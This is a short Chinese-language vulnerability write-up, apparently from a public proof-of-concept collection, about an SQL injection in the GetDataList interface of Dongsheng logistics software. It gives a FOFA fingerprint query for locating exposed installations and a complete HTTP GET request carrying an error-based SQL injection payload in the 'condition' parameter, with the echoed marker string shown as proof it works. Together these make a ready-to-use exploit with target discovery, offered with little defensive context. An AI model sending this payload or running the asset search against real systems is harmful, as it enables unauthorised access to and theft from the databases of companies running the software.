# 东胜物流软件GetDataList存在SQL注入漏洞

# 一、漏洞简介
东胜物流软件是一款致力于为客户提供IT支撑的 SOP， 帮助客户大幅提高工作效率，降低各个环节潜在风险的物流软件。东胜物流软件 GetDataList接口处存在 SQL 注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 东胜物流软件

# 三、资产测绘
+ fofa`fid="Z4c2hPCi5IR/AnH5vZXNSQ=="`
+ 特征

![1708936256348-8d7bf6c6-a3aa-4202-9f9c-a325885eef04.png](./img/QafmrT00Cjqvxhgl/1708936256348-8d7bf6c6-a3aa-4202-9f9c-a325885eef04-278539.png)

# 四、漏洞复现
```plain
GET /TruckMng/MsWlDriver/GetDataList?_dc=1665626804091&start=0&limit=30&sort&condition=123+IN+(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113))--%20&page=1&page=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

![1708944988680-1741de01-6614-4b5a-8913-8f29d37c10da.png](./img/QafmrT00Cjqvxhgl/1708944988680-1741de01-6614-4b5a-8913-8f29d37c10da-630979.png)

```plain
qxpqqqzkqq
```



> 更新: 2024-02-29 23:55:41  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mp5bydo55w118fyr>